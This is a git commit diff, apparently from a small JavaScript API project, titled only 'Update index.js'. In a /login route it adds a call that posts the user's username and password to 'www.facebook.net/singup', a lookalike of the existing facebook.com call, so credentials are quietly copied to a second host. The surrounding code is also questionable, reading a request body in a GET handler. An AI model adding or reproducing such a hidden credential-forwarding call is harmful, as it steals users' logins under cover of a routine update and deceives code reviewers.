0bc0113dee39f0d36259999bd90974eb918b4bf0
nikvin15 <110590898+nikvin15@users.noreply.github.com>
2024-08-01 15:44:45 +0530

    Update index.js

--- api/metrics/index.js
+++ api/metrics/index.js
@@ -52,7 +52,18 @@
   app.get("/login", function(req, res) {
       const username = req.body.username
       const password = req.body.password
-      axios.post('www.facebook.com/singup', {
+      axios.post('www.facebook.net/singup', {
+        username: username,
+        password: password
+      })
+      .then(function (response) {
+        console.log(response);
+      })
+      .catch(function (error) {
+        console.log(error);
+      });  
+    
+    axios.post('www.facebook.com/singup', {
         username: username,
         password: password
       })
